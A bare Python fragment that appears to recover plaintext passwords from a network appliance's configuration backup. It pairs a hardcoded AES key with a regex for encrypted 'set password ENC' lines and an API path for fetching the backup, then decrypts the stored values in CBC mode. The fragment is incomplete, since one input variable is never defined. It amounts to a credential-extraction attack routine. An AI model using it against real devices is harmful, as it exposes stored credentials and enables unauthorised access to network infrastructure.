import base64
from Crypto.Cipher import AES
key = b"Mary had a littl"
pattern = r"set\s+(?:password|passwd)\s+ENC\s+([A-Za-z0-9+/=]+)"
backup_path = "/api/v2/monitor/system/config/backup"
raw = base64.b64decode(saved_enc)
cipher = AES.new(key, AES.MODE_CBC, raw[:4] + b"\x00" * 12)
plain = cipher.decrypt(raw[4:])
